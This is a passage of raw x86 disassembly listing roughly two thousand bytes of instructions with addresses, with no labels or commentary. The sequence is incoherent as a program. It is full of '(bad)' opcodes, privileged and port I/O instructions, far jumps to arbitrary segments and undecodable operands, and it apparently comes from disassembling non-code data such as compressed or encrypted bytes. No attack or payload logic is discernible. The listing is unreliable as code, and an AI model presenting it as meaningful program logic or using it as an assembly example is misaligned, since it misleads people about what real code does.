  52f50e:	stos   DWORD PTR es:[edi],eax
  52f50f:	pop    ebp
  52f510:	xchg   ebp,eax
  52f511:	dec    ebx
  52f512:	adc    eax,0xb6634e9f
  52f517:	inc    eax
  52f518:	cmp    BYTE PTR [ebp-0x68],dl
  52f51b:	mov    dh,0x65
  52f51d:	xchg   ebp,eax
  52f51e:	paddusw mm6,QWORD PTR [edx+0x41ea55f7]
  52f525:	dec    eax
  52f526:	mov    esp,0x80f7a30
  52f52b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52f52c:	xor    DWORD PTR [ebp+0xf2515a5],esp
  52f532:	popa   
  52f533:	les    ebx,FWORD PTR [eax-0x3b]
  52f536:	inc    edx
  52f537:	fwait
  52f538:	and    DWORD PTR [edi],eax
  52f53a:	gs jmp 0x52f552
  52f53d:	in     eax,0x61
  52f53f:	and    dh,0x6e
  52f542:	inc    edx
  52f543:	jb     0x52f585
  52f545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52f546:	cld    
  52f547:	jno    0x52f568
  52f549:	or     BYTE PTR [ebx],ah
  52f54b:	cmp    eax,0xba33370
  52f550:	aas    
  52f551:	(bad)  
  52f552:	sahf   
  52f553:	jae    0x52f4f1
  52f555:	jo     0x52f526
  52f557:	in     al,0x57
  52f559:	add    eax,0x4d6d1d18
  52f55e:	rcr    DWORD PTR [edi+0x61f04e5a],cl
  52f564:	sub    BYTE PTR [edx+ebp*2],ch
  52f567:	push   eax
  52f568:	fcmovnu st,st(6)
  52f56a:	out    0xaf,eax
  52f56c:	xor    eax,0x53e54222
  52f571:	fisub  WORD PTR [eax+ecx*4-0x11]
  52f575:	jb     0x52f5d4
  52f577:	jge    0x52f5f4
  52f579:	outs   dx,BYTE PTR ds:[esi]
  52f57a:	es arpl WORD PTR ss:[edx],ax
  52f57e:	mov    edi,DWORD PTR [edi+0x77a9bd2b]
  52f584:	iret   
  52f585:	jo     0x52f515
  52f587:	sbb    esp,edx
  52f589:	inc    ebx
  52f58a:	pop    eax
  52f58b:	mov    esp,0xeb14b504
  52f590:	push   ds
  52f591:	(bad)  
  52f592:	pop    esi
  52f593:	shl    DWORD PTR [edi+0x4bb06ab2],cl
  52f599:	pop    edi
  52f59a:	stos   BYTE PTR es:[edi],al
  52f59b:	sub    eax,0xa0f535c5
  52f5a0:	jmp    FWORD PTR [ecx+0x38b82643]
  52f5a6:	cmp    eax,DWORD PTR [edx+ebp*4-0x38]
  52f5aa:	inc    edi
  52f5ab:	inc    BYTE PTR [ecx+0x68d4f3d6]
  52f5b1:	int3   
  52f5b2:	test   DWORD PTR [edx],edx
  52f5b4:	mov    edx,DWORD PTR [esi-0x16]
  52f5b7:	mov    ch,BYTE PTR [eax+eax*2+0x23]
  52f5bb:	jmp    0x52f5ec
  52f5bd:	sbb    ebx,DWORD PTR [ecx+0x1d]
  52f5c0:	xor    DWORD PTR [ecx-0x39b671fa],ebx
  52f5c6:	gs mov edi,0xe08495f6
  52f5cc:	mov    edx,0xd1310541
  52f5d1:	push   cs
  52f5d2:	jo     0x52f575
  52f5d4:	adc    bl,BYTE PTR [ebx]
  52f5d6:	push   ebx
  52f5d7:	adc    ch,dl
  52f5d9:	jae    0x52f584
  52f5db:	fcom   DWORD PTR [eax]
  52f5dd:	jae    0x52f58a
  52f5df:	daa    
  52f5e0:	adc    BYTE PTR [edx],cl
  52f5e2:	rcr    DWORD PTR [edi],1
  52f5e4:	push   cs
  52f5e5:	dec    eax
  52f5e6:	shr    BYTE PTR [ecx+edi*2],1
  52f5e9:	lods   eax,DWORD PTR ds:[esi]
  52f5ea:	jns    0x52f577
  52f5ec:	sbb    DWORD PTR [esi],ecx
  52f5ee:	or     BYTE PTR [eax+0x6a],cl
  52f5f1:	das    
  52f5f2:	sub    DWORD PTR [esi],esi
  52f5f4:	dec    edx
  52f5f5:	imul   ebx,DWORD PTR [esi+0x1e],0xcad46dcb
  52f5fc:	mov    dh,0xd3
  52f5fe:	pop    ebx
  52f5ff:	lods   al,BYTE PTR ds:[esi]
  52f600:	pop    ss
  52f601:	(bad)  
  52f602:	sbb    eax,0x75d6719a
  52f607:	sbb    al,0x8e
  52f609:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52f60a:	jae    0x52f595
  52f60c:	cld    
  52f60d:	xor    al,0xf8
  52f60f:	sahf   
  52f610:	out    dx,eax
  52f611:	jno    0x52f5d9
  52f613:	mov    cs,WORD PTR [ecx-0x3]
  52f616:	mov    eax,DWORD PTR [ecx+esi*4+0x71]
  52f61a:	push   es
  52f61b:	in     al,0xce
  52f61d:	add    bl,BYTE PTR [eax]
  52f61f:	cmp    ebp,DWORD PTR [ebp-0x3b]
  52f622:	stos   DWORD PTR es:[edi],eax
  52f623:	out    dx,al
  52f624:	and    ah,BYTE PTR [ebx+0x19a5b9e3]
  52f62a:	add    eax,0x21146650
  52f62f:	in     eax,dx
  52f630:	shl    cl,0x8a
  52f633:	push   esi
  52f634:	ror    BYTE PTR [esi],0x4b
  52f637:	retf   0xd93b
  52f63a:	xchg   edi,eax
  52f63b:	hlt    
  52f63c:	pushf  
  52f63d:	icebp  
  52f63e:	push   edx
  52f63f:	imul   edi,edi,0xffffffd3
  52f642:	test   BYTE PTR ss:[ecx-0x521ef9b],dh
  52f649:	data16 adc al,0x4c
  52f64c:	sbb    BYTE PTR [edx+0x29],0x12
  52f650:	jecxz  0x52f611
  52f652:	cmp    DWORD PTR [edi+ebp*1],0x2646dd29
  52f659:	cld    
  52f65a:	pop    eax
  52f65b:	sbb    esi,eax
  52f65d:	mov    edx,0xba3d105b
  52f662:	ins    BYTE PTR es:[edi],dx
  52f663:	dec    ebp
  52f664:	sbb    edx,esp
  52f666:	pop    eax
  52f667:	xchg   ecx,eax
  52f668:	cmp    ah,cl
  52f66a:	cmp    eax,0x7af2d8fc
  52f66f:	bound  esp,QWORD PTR [ebx-0xc]
  52f672:	cmp    eax,DWORD PTR [ecx]
  52f674:	jge    0x52f5fd
  52f676:	neg    edi
  52f678:	or     ebp,ebp
  52f67a:	jg     0x52f690
  52f67c:	mov    DWORD PTR [edi-0x74],ecx
  52f67f:	adc    eax,0x987830e2
  52f684:	pop    ebp
  52f685:	and    DWORD PTR [edx+0x28],0x53
  52f689:	push   ebx
  52f68a:	xor    eax,0x839353a2
  52f68f:	push   0x5c
  52f691:	fs jnp 0x52f713
  52f694:	cmp    DWORD PTR [eax],ecx
  52f696:	mov    dl,0x3
  52f698:	pop    ds
  52f699:	ret    0xa08c
  52f69c:	ret    0x561b
  52f69f:	lods   al,BYTE PTR ds:[esi]
  52f6a0:	xchg   ecx,eax
  52f6a1:	cmp    eax,0x90514678
  52f6a6:	sub    dh,dh
  52f6a8:	push   esp
  52f6a9:	xor    DWORD PTR [ebx+0x6f7a8392],ebp
  52f6af:	mov    eax,ds:0xc934f3e
  52f6b4:	into   
  52f6b5:	sub    DWORD PTR ds:0xb07ac0f9,ebx
  52f6bb:	stos   DWORD PTR es:[edi],eax
  52f6bc:	sub    DWORD PTR [ebp+0x2bf8bfa4],0x9d9db2a4
  52f6c6:	fs push edi
  52f6c8:	lds    ecx,FWORD PTR [ecx-0xed2c9f8]
  52f6ce:	out    dx,al
  52f6cf:	sbb    eax,0x452dfcd4
  52f6d4:	bnd jge 0x52f6f1
  52f6d7:	in     al,0xc
  52f6d9:	mov    esi,0x7ec014ab
  52f6de:	jmp    0xfd2da02a
  52f6e3:	std    
  52f6e4:	popf   
  52f6e5:	dec    edi
  52f6e6:	dec    ebx
  52f6e7:	mov    ds:0x26ab5846,al
  52f6ec:	bound  ebx,QWORD PTR [edi-0x3eef3591]
  52f6f2:	es jg  0x52f6ee
  52f6f5:	push   esi
  52f6f6:	std    
  52f6f7:	and    eax,0x79658e34
  52f6fc:	pop    ss
  52f6fd:	cli    
  52f6fe:	jge    0x52f6d6
  52f700:	xchg   eax,ecx
  52f702:	sub    eax,0xf1711a23
  52f707:	fnsave [ecx-0x5d]
  52f70a:	data16 sbb al,0x29
  52f70d:	fdivp  st(6),st
  52f70f:	in     al,0x15
  52f711:	push   0xffffffe7
  52f713:	and    eax,DWORD PTR [edx-0x2b]
  52f716:	pop    esi
  52f717:	push   ds
  52f718:	or     eax,0xb400aade
  52f71d:	sbb    BYTE PTR ds:0x57e1cd7c,cl
  52f723:	outs   dx,DWORD PTR ds:[esi]
  52f724:	lea    edi,[esi+0x67e706f1]
  52f72a:	pushf  
  52f72b:	(bad)  
  52f72c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52f72d:	pop    edi
  52f72e:	jg     0x52f7ae
  52f730:	and    BYTE PTR [ebx+eax*4-0x5d],bh
  52f734:	dec    ebp
  52f735:	test   BYTE PTR [ebp-0x37],dl
  52f738:	pop    eax
  52f739:	sbb    BYTE PTR es:[esi+0x39],bl
  52f73d:	or     eax,0x62c02b84
  52f742:	jecxz  0x52f6ec
  52f744:	add    al,0x30
  52f746:	dec    esi
  52f747:	into   
  52f748:	inc    eax
  52f749:	and    al,0xd0
  52f74b:	mov    cl,0xdd
  52f74d:	mov    esi,0x91b52c9
  52f752:	push   edi
  52f753:	inc    eax
  52f754:	adc    bh,BYTE PTR [esi+0x7e]
  52f757:	lea    esi,[eax+0x25]
  52f75a:	cmc    
  52f75b:	js     0x52f771
  52f75d:	push   ebx
  52f75e:	sbb    DWORD PTR [edi+0x3d],eax
  52f761:	mov    dl,0x83
  52f763:	repz ret 0xa9c
  52f767:	je     0x52f7a9
  52f769:	mov    al,ds:0x63c953e3
  52f76e:	mov    ch,dh
  52f770:	sti    
  52f771:	call   0x531e:0x132c0590
  52f778:	and    DWORD PTR [edx],eax
  52f77a:	test   al,0x35
  52f77c:	frstor [ebp-0x4aaa7499]
  52f782:	popf   
  52f783:	call   0x7596:0xdebc6482
  52f78a:	int    0xf9
  52f78c:	rcr    DWORD PTR [eax-0x4a4741bd],cl
  52f792:	test   ch,dl
  52f794:	iret   
  52f795:	cs pop esi
  52f797:	(bad)  
  52f798:	adc    al,0xfc
  52f79a:	pushf  
  52f79b:	in     eax,0x8e
  52f79d:	or     bl,BYTE PTR [ebx]
  52f79f:	mov    edi,0xdf1f93c
  52f7a4:	push   0xf0149753
  52f7a9:	xchg   DWORD PTR [bp+di+0x202d],ebp
  52f7ae:	nop
  52f7af:	stos   DWORD PTR es:[edi],eax
  52f7b0:	cld    
  52f7b1:	pop    edi
  52f7b2:	pushf  
  52f7b3:	and    DWORD PTR [ebx-0x452aa6b3],ebp
  52f7b9:	cmc    
  52f7ba:	push   esi
  52f7bb:	into   
  52f7bc:	jnp    0x52f7dd
  52f7be:	jge    0x52f751
  52f7c0:	cli    
  52f7c1:	(bad)  
  52f7c3:	or     al,0xd9
  52f7c5:	and    eax,0x254fb513
  52f7ca:	xor    DWORD PTR [eax-0x2f],esi
  52f7cd:	(bad)  
  52f7cf:	and    edi,ebp
  52f7d1:	mov    ch,BYTE PTR [ecx+0x83a7d4b]
  52f7d7:	scas   al,BYTE PTR es:[edi]
  52f7d8:	ins    DWORD PTR es:[edi],dx
  52f7d9:	in     eax,0x76
  52f7db:	inc    esp
  52f7dc:	adc    bh,BYTE PTR [ebp+0x37]
  52f7df:	lods   al,BYTE PTR ds:[esi]
  52f7e0:	(bad)  
  52f7e2:	cli    
  52f7e3:	and    al,0x1f
  52f7e5:	add    eax,0xfe199a45
  52f7ea:	dec    edx
  52f7eb:	jmp    0xc0ee:0xea44668b
  52f7f2:	xchg   esi,eax
  52f7f3:	xchg   esp,eax
  52f7f4:	(bad)  
  52f7f5:	and    eax,0xad07da56
  52f7fa:	bts    edi,ebx
  52f7fd:	stc    
  52f7fe:	mov    DWORD PTR [esi],ecx
  52f800:	retf   
  52f801:	and    eax,0xb4231d9a
  52f806:	std    
  52f807:	bound  eax,QWORD PTR [edx-0x7b]
  52f80a:	push   ecx
  52f80b:	(bad)  
  52f80c:	jmp    0x52f83d
  52f80e:	push   ds
  52f80f:	cwde   
  52f810:	ret    0x6d00
  52f813:	daa    
  52f814:	mov    eax,ds:0x88d1d9ec
  52f819:	sub    eax,0x3a31a8a2
  52f81e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52f81f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52f820:	div    BYTE PTR ss:[eax+eiz*8-0x2e768ca6]
  52f828:	xor    eax,0x99220859
  52f82d:	(bad)  
  52f82e:	jle    0x52f7bf
  52f830:	dec    esi
  52f831:	dec    ebx
  52f832:	outs   dx,DWORD PTR ds:[esi]
  52f833:	xchg   edx,eax
  52f834:	adc    al,0x5d
  52f836:	sbb    BYTE PTR [edi],ah
  52f838:	mov    bh,0x61
  52f83a:	lods   al,BYTE PTR ds:[esi]
  52f83b:	mov    WORD PTR [edi-0x69fae396],fs
  52f841:	pushf  
  52f842:	jmp    0xf632dd68
  52f847:	adc    DWORD PTR [ebx+eiz*8-0x6b],edx
  52f84b:	loope  0x52f817
  52f84d:	cmp    eax,0x877bcfa7
  52f852:	and    DWORD PTR [esp+eiz*4],esi
  52f855:	arpl   WORD PTR [ebx-0x15b6fc30],di
  52f85b:	jge    0x52f844
  52f85d:	cmp    ebp,DWORD PTR [eax+0x72470541]
  52f863:	stos   BYTE PTR es:[edi],al
  52f864:	dec    edx
  52f865:	ds push edx
  52f867:	xchg   ebx,eax
  52f868:	xor    eax,ebx
  52f86a:	inc    eax
  52f86b:	pop    ebx
  52f86c:	or     ah,bh
  52f86e:	mov    cl,0xc9
  52f870:	ds (bad) 
  52f872:	adc    eax,0x7cd795f8
  52f877:	sub    dl,BYTE PTR [eax]
  52f879:	and    bl,dh
  52f87b:	setl   BYTE PTR [edx-0x5cce8d11]
  52f882:	not    DWORD PTR [eax]
  52f884:	or     cl,BYTE PTR [esi-0x378b8632]
  52f88a:	cli    
  52f88b:	retf   0x5d0c
  52f88e:	or     dl,dh
  52f890:	adc    DWORD PTR [ebx-0x47],0x430a3c03
  52f897:	mov    al,ds:0x1ef9bd3e
  52f89c:	xchg   ebx,eax
  52f89d:	stos   BYTE PTR es:[edi],al
  52f89e:	pushf  
  52f89f:	or     bl,BYTE PTR [ecx-0x4a795311]
  52f8a5:	sbb    al,0xdf
  52f8a7:	inc    dx
  52f8a9:	sub    eax,esp
  52f8ab:	sti    
  52f8ac:	cmp    DWORD PTR [eax+0x65cbe6b],ebx
  52f8b2:	mov    ch,0x68
  52f8b4:	dec    esi
  52f8b5:	shr    BYTE PTR [edx+0x2b],cl
  52f8b8:	push   cs
  52f8b9:	push   ecx
  52f8ba:	daa    
  52f8bb:	push   eax
  52f8bc:	stos   BYTE PTR es:[edi],al
  52f8bd:	fcmovu st,st(5)
  52f8bf:	adc    al,0x42
  52f8c1:	mov    ebx,0x6db512d1
  52f8c6:	cs pushf 
  52f8c8:	xor    ebx,DWORD PTR [ebx]
  52f8ca:	in     eax,0xb3
  52f8cc:	push   0x86d73810
  52f8d1:	popa   
  52f8d2:	cdq    
  52f8d3:	jecxz  0x52f857
  52f8d5:	imul   ecx,esi,0x7d
  52f8d8:	out    dx,eax
  52f8d9:	mov    cl,0x20
  52f8db:	imul   ebp,ebx,0xa
  52f8de:	xor    al,0xea
  52f8e0:	ror    ah,0x8d
  52f8e3:	cmc    
  52f8e4:	sbb    cl,BYTE PTR [ebp+eiz*8-0x57]
  52f8e8:	xor    BYTE PTR [ecx+eiz*8+0x24950872],ch
  52f8ef:	ds je  0x52f8e1
  52f8f2:	adc    eax,0x171ec6b6
  52f8f7:	pop    edi
  52f8f8:	and    dl,0x44
  52f8fb:	jbe    0x52f886
  52f8fd:	cld    
  52f8fe:	push   es
  52f8ff:	cdq    
  52f900:	frstor [ebp+0x67]
  52f903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52f904:	fdivr  st(0),st
  52f906:	mov    ch,0xed
  52f908:	jecxz  0x52f931
  52f90a:	jne    0x52f8a5
  52f90c:	lea    edx,[esi-0x5cb4b064]
  52f912:	stos   BYTE PTR es:[edi],al
  52f913:	mov    ecx,DWORD PTR [edx]
  52f915:	mov    ds:0x7ebac35c,eax
  52f91a:	xchg   ebx,eax
  52f91b:	adc    DWORD PTR [esi-0xa],0x28
  52f91f:	int3   
  52f920:	add    al,0x54
  52f922:	dec    edx
  52f923:	push   ecx
  52f924:	sub    esi,DWORD PTR ds:0xe403016c
  52f92a:	sbb    BYTE PTR [esi+0x270725c7],cl
  52f930:	adc    eax,0x3f85f8a9
  52f935:	xchg   edi,eax
  52f936:	sub    bl,BYTE PTR [eax-0x3c917fc0]
  52f93c:	int    0x95
  52f93e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52f93f:	ret    
  52f940:	sbb    BYTE PTR [eax+0x5d5b6431],0x96
  52f947:	inc    ebx
  52f948:	xor    al,BYTE PTR [ebx-0x45]
  52f94b:	lods   al,BYTE PTR ds:[esi]
  52f94c:	shr    ah,0x7d
  52f94f:	pop    esp
  52f950:	cmp    edx,DWORD PTR [eax+0x4e6efa36]
  52f956:	mul    bl
  52f958:	(bad)  
  52f959:	xor    al,BYTE PTR [ecx-0x64]
  52f95c:	(bad)  
  52f95d:	repz add dh,ch
  52f960:	and    DWORD PTR [ecx],ebx
  52f962:	(bad)  
  52f963:	sub    BYTE PTR [ebx+edi*1],al
  52f966:	dec    BYTE PTR [esi-0x2a7b0b89]
  52f96c:	cli    
  52f96d:	push   cs
  52f96e:	cmc    
  52f96f:	sahf   
  52f970:	jno    0x52f9b6
  52f972:	inc    eax
  52f973:	inc    ebx
  52f974:	in     al,dx
  52f975:	adc    ebp,eax
  52f977:	cmp    al,0x7d
  52f979:	jno    0x52f9ce
  52f97b:	lahf   
  52f97c:	ds jecxz 0x52f903
  52f97f:	cld    
  52f980:	retf   
  52f981:	inc    edi
  52f982:	or     DWORD PTR [esi],0x52
  52f985:	iret   
  52f986:	mov    ds:0x299476b9,eax
  52f98b:	pop    ds
  52f98c:	aad    0x43
  52f98e:	pop    edx
  52f98f:	push   ebp
  52f990:	iret   
  52f991:	sbb    edx,esp
  52f993:	es inc ebx
  52f995:	and    al,0x98
  52f997:	dec    ebp
  52f998:	adc    BYTE PTR [edi-0x18],0x61
  52f99c:	push   eax
  52f99d:	retf   0x24e9
  52f9a0:	xor    al,0xea
  52f9a2:	repz lahf 
  52f9a4:	out    dx,al
  52f9a5:	and    esi,DWORD PTR [ebx-0x2a]
  52f9a8:	loope  0x52f977
  52f9aa:	xor    ecx,DWORD PTR [edx+0x76]
  52f9ad:	or     BYTE PTR [ecx+0x3b],dl
  52f9b0:	lock enter 0x4c5,0x5d
  52f9b5:	push   ss
  52f9b6:	mov    ebx,0x6322d8b7
  52f9bb:	enter  0x756a,0x29
  52f9bf:	(bad)  
  52f9c0:	aaa    
  52f9c1:	inc    edx
  52f9c2:	cmp    al,0x6c
  52f9c4:	nop
  52f9c5:	dec    esi
  52f9c6:	leave  
  52f9c7:	out    dx,al
  52f9c8:	mov    edx,0xa79af8cd
  52f9cd:	ret    0x40d3
  52f9d0:	sub    edi,edx
  52f9d2:	mov    bh,0x58
  52f9d4:	adc    DWORD PTR [esi-0x701c966b],ecx
  52f9da:	lea    ebx,[ebx]
  52f9dc:	div    BYTE PTR [ecx-0x19]
  52f9df:	and    al,0x56
  52f9e1:	in     eax,dx
  52f9e2:	push   ebx
  52f9e3:	test   DWORD PTR [esi-0x32],edi
  52f9e6:	pop    esi
  52f9e7:	pop    edi
  52f9e8:	and    al,0xf6
  52f9ea:	fcmovnu st,st(1)
  52f9ec:	jmp    0x52f985
  52f9ee:	jbe    0x52fa41
  52f9f0:	loopne 0x52fa47
  52f9f2:	ins    BYTE PTR es:[edi],dx
  52f9f3:	sbb    al,0x8d
  52f9f5:	jmp    0x6b71:0x7c74a36d
  52f9fc:	clc    
  52f9fd:	xchg   DWORD PTR [ebx-0x30],eax
  52fa00:	jecxz  0x52fa1b
  52fa02:	sbb    eax,0x8df029bf
  52fa07:	fldenv [ebx]
  52fa09:	test   bh,0x3c
  52fa0c:	loopne 0x52fa72
  52fa0e:	mov    edi,0xa13c3153
  52fa13:	jecxz  0x52fa60
  52fa15:	mov    esp,0x869e4773
  52fa1a:	sahf   
  52fa1b:	dec    ebp
  52fa1c:	mov    eax,ds:0x3053f44
  52fa21:	ja     0x52fa65
  52fa23:	sub    bl,dh
  52fa25:	jb     0x52fa8e
  52fa27:	in     eax,dx
  52fa28:	(bad)  
  52fa29:	sbb    al,0x3e
  52fa2b:	or     ah,dh
  52fa2d:	loopne 0x52f9c4
  52fa2f:	jp     0x52fa2b
  52fa31:	adc    ebx,DWORD PTR [edi-0x30]
  52fa34:	mov    ebx,ds
  52fa36:	and    eax,0x583b674c
  52fa3b:	or     esp,0x8
  52fa3e:	xchg   edx,eax
  52fa3f:	xchg   esi,eax
  52fa40:	lods   al,BYTE PTR ds:[esi]
  52fa41:	shl    DWORD PTR [ecx-0x5b494fb7],0x24
  52fa48:	aaa    
  52fa49:	inc    esi
  52fa4a:	cmp    eax,eax
  52fa4c:	scas   eax,DWORD PTR es:[edi]
  52fa4d:	retf   
  52fa4e:	xchg   esp,eax
  52fa4f:	mov    ?,WORD PTR [esp+ecx*4+0x0]
  52fa53:	(bad)  
  52fa54:	xlat   BYTE PTR ds:[ebx]
  52fa55:	xor    DWORD PTR [eax-0x56],ebp
  52fa58:	push   esi
  52fa59:	xchg   esp,eax
  52fa5a:	sub    DWORD PTR [eax+0x81feb59],ebp
  52fa60:	mov    ch,0xba
  52fa62:	loopne 0x52fac5
  52fa64:	mov    al,ds:0x4466f074
  52fa69:	mov    WORD PTR [esi+0xd],ss
  52fa6c:	leave  
  52fa6d:	xchg   ebx,eax
  52fa6e:	shl    BYTE PTR ds:0x48de064,1
  52fa74:	sbb    BYTE PTR [esi-0x76722126],bh
  52fa7a:	xchg   edx,eax
  52fa7b:	or     al,0xf0
  52fa7d:	in     al,dx
  52fa7e:	xor    DWORD PTR [eax+0x76],ebp
  52fa81:	xchg   edx,eax
  52fa82:	push   ebx
  52fa83:	shr    edi,0x1b
  52fa86:	ja     0x52fa6d
  52fa88:	push   cs
  52fa89:	mov    dl,BYTE PTR [edi+0x48c9162a]
  52fa8f:	iret   
  52fa90:	loop   0x52fa8c
  52fa92:	pop    es
  52fa93:	dec    ebx
  52fa94:	shr    DWORD PTR ss:[edx],0x9f
  52fa98:	add    BYTE PTR [ebp+ebp*2-0x1cc2997c],dl
  52fa9f:	inc    esp
  52faa0:	adc    BYTE PTR [ecx-0xf],cl
  52faa3:	aas    
  52faa4:	mov    ds:0x461bbf49,eax
  52faa9:	call   0xd356:0x61fa27ab
  52fab0:	push   ebp
  52fab1:	inc    esp
  52fab2:	xor    eax,0xb2465ad9
  52fab7:	fs fst st(5)
  52faba:	clc    
  52fabb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52fabc:	out    dx,eax
  52fabd:	sbb    dl,BYTE PTR [eax-0x66555328]
  52fac3:	or     al,0x3e
  52fac5:	push   ebp
  52fac6:	dec    edi
  52fac7:	sbb    al,0x65
  52fac9:	lods   eax,DWORD PTR gs:[esi]
  52facb:	fist   DWORD PTR [ecx-0x7f49889]
  52fad1:	in     al,dx
  52fad2:	sub    esp,eax
  52fad4:	xchg   DWORD PTR [ebx],esi
  52fad6:	ret    
  52fad7:	mov    bl,BYTE PTR [esi+0x6b]
  52fada:	popa   
  52fadb:	fcomip st,st(4)
  52fadd:	popa   
  52fade:	mov    bh,0xa
  52fae0:	fbld   TBYTE PTR [edi]
  52fae2:	pop    es
  52fae3:	(bad)  
  52fae4:	push   eax
  52fae5:	mov    ebp,0x88e39a8e
  52faea:	inc    esp
  52faeb:	xlat   BYTE PTR ds:[ebx]
  52faec:	lods   eax,DWORD PTR ds:[esi]
  52faed:	jge    0x52fac6
  52faef:	test   BYTE PTR [eax],bl
  52faf1:	xchg   edi,eax
  52faf2:	push   esp
  52faf3:	jo     0x52fb51
  52faf5:	jmp    0xf2b8eadc
  52fafa:	dec    eax
  52fafb:	jns    0x52facb
  52fafd:	pop    eax
  52fafe:	mov    bl,0x8d
  52fb00:	and    ebp,ecx
  52fb02:	div    BYTE PTR [edi]
  52fb04:	fldcw  WORD PTR [ecx]
  52fb06:	add    eax,0xf9e416d3
  52fb0b:	(bad)  
  52fb0c:	xor    eax,0x44751f54
  52fb11:	dec    eax
  52fb12:	je     0x52fac9
  52fb14:	add    al,0x99
  52fb16:	mov    ?,WORD PTR [eax+esi*2]
  52fb19:	dec    ebx
  52fb1a:	dec    ebx
  52fb1b:	test   BYTE PTR [ebp-0x7],bl
  52fb1e:	and    BYTE PTR ds:0x682c4f17,0xaa
  52fb25:	jge    0x52fb8b
  52fb27:	enter  0x9262,0xb1
  52fb2b:	xor    al,0x29
  52fb2d:	inc    esp
  52fb2e:	int    0x1f
  52fb30:	in     al,0x44
  52fb32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52fb33:	or     ebp,edi
  52fb35:	pop    es
  52fb36:	stos   BYTE PTR es:[edi],al
  52fb37:	pop    eax
  52fb38:	mov    al,0xb
  52fb3a:	and    edi,DWORD PTR [bx+si]
  52fb3d:	bnd jmp 0x70ac8826
  52fb43:	pop    esp
  52fb44:	loope  0x52fbad
  52fb46:	jne    0x52faf3
  52fb48:	jmp    0x40c35bb6
  52fb4d:	xor    al,0xb2
  52fb4f:	mov    eax,ds:0x31a0f254
  52fb54:	fcomp  QWORD PTR [ebp-0x1b]
  52fb57:	xor    BYTE PTR [ebx-0x152b6df3],al
  52fb5d:	repnz ss pop edx
  52fb60:	rol    BYTE PTR [esi],1
  52fb62:	outs   dx,BYTE PTR ds:[esi]
  52fb63:	push   0x7ae3bf7
  52fb68:	mov    ds,WORD PTR [ebp-0x79ac3c42]
  52fb6e:	pop    edx
  52fb6f:	sub    edx,DWORD PTR [eax-0x1f]
  52fb72:	mov    eax,ds:0xf8ffcf49
  52fb77:	pop    ecx
  52fb78:	rcl    DWORD PTR ds:0xc3abdc66,1
  52fb7e:	and    al,0x75
  52fb80:	jg     0x52fb9f
  52fb82:	jo     0x52fb7b
  52fb84:	mov    ds:0x7ed2b591,eax
  52fb89:	in     al,0xf
  52fb8b:	jg     0x52fb8f
  52fb8d:	ins    BYTE PTR es:[edi],dx
  52fb8e:	sbb    ecx,DWORD PTR [bx-0x7d6a]
  52fb93:	pop    ss
  52fb94:	adc    BYTE PTR [ebx],bl
  52fb96:	xor    DWORD PTR [ebx-0x7e],0xfffffffe
  52fb9a:	and    DWORD PTR [edx],esi
  52fb9c:	and    eax,0xb6ee71e6
  52fba1:	fnstsw WORD PTR [esi]
  52fba3:	sbb    eax,DWORD PTR [edx+0x4f]
  52fba6:	and    eax,0x5a4e4da0
  52fbab:	iret   
  52fbac:	pop    edx
  52fbad:	xchg   esp,eax
  52fbae:	in     eax,dx
  52fbaf:	xchg   esp,eax
  52fbb0:	arpl   WORD PTR [esi],cx
  52fbb2:	fnstcw WORD PTR [ecx]
  52fbb4:	daa    
  52fbb5:	sub    edx,DWORD PTR [ebx]
  52fbb7:	cmp    ch,0xd6
  52fbba:	jp     0x52fbad
  52fbbc:	add    ebp,DWORD PTR [eax-0x6c]
  52fbbf:	pop    ss
  52fbc0:	xchg   BYTE PTR ds:0xd907f845,ah
  52fbc6:	fnsave [esi+0x59]
  52fbc9:	add    ah,BYTE PTR [edi+0x77]
  52fbcc:	jecxz  0x52fb7a
  52fbce:	(bad)  
  52fbcf:	and    dl,BYTE PTR [ebp-0xa]
  52fbd2:	mov    esp,0xa88c08b9
  52fbd7:	mov    ebp,0x4bf58c41
  52fbdc:	inc    eax
  52fbdd:	outs   dx,BYTE PTR es:[esi]
  52fbdf:	mov    esp,DWORD PTR [eax+esi*2]
  52fbe2:	outs   dx,BYTE PTR ds:[esi]
  52fbe3:	gs ret 
  52fbe5:	aas    
  52fbe6:	cmp    bh,ch
  52fbe8:	push   0xffffffa7
  52fbea:	repnz aad 0x9a
  52fbed:	xor    eax,ebx
  52fbef:	jns    0x52fc45
  52fbf1:	aaa    
  52fbf2:	push   ds
  52fbf3:	daa    
  52fbf4:	cmp    ecx,DWORD PTR [ebx+0x7c]
  52fbf7:	jle    0x52fc44
  52fbf9:	cli    
  52fbfa:	rol    DWORD PTR [esi+edi*1+0x4bcafdb0],1
  52fc01:	or     edx,DWORD PTR [edi+0x2b411348]
  52fc07:	mov    eax,0x147b6ce9
  52fc0c:	push   cs
  52fc0d:	gs jns 0x52fc77
  52fc10:	fucom  st(7)
  52fc12:	lea    esp,[eax+eax*2+0x16c6957f]
  52fc19:	mov    ebp,0x887b561b
  52fc1e:	dec    edx
  52fc1f:	mov    ds:0xad2a5a34,eax
  52fc24:	push   eax
  52fc25:	push   ecx
  52fc26:	outs   dx,BYTE PTR ds:[esi]
  52fc27:	nop
  52fc28:	pop    ecx
  52fc29:	dec    ebx
  52fc2b:	cwde   
  52fc2c:	add    al,BYTE PTR [edx]
  52fc2e:	xchg   edx,eax
  52fc2f:	jmp    0x1087:0xf4f04822
  52fc36:	jmp    0x92ef:0x7a90b995
  52fc3d:	add    DWORD PTR [edi],0xffffff96
  52fc40:	dec    edx
  52fc41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52fc42:	stos   BYTE PTR es:[edi],al
  52fc43:	dec    ebp
  52fc44:	and    cl,cl
  52fc46:	shl    BYTE PTR [eax],cl
  52fc48:	adc    al,0x19
  52fc4a:	test   edi,esi
  52fc4c:	dec    ebx
  52fc4d:	pop    esp
  52fc4e:	jbe    0x52fc82
  52fc50:	dec    ebp
  52fc51:	sar    BYTE PTR [edi-0x59d6fd20],0xdb
